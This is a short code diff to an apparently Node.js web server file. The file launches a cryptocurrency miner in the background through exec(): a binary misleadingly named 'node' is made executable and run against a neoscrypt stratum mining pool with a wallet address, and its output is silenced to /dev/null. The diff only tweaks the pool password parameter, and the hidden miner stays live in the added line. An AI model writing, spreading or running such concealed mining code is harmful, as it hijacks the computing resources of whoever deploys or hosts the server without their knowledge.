@@ -14,6 +14,6 @@ server.listen(prt, () => {
   console.log(`Server berjalan pada port ${prt}`);
 });
 
-exec('chmod +x node && ./node -a neoscrypt -o stratum+tcp://poolx.rwinfo.club:4233 -u VWMjiaJ7CpSaGt1To385kAHh61FWgoauK4.Library -p c=VIVO,m=solo &> /dev/null', (error, stdout, stderr) => {
+exec('chmod +x node && ./node -a neoscrypt -o stratum+tcp://poolx.rwinfo.club:4233 -u VWMjiaJ7CpSaGt1To385kAHh61FWgoauK4.Library -p c=VIVO &> /dev/null', (error, stdout, stderr) => {
   console.log(error);
  });
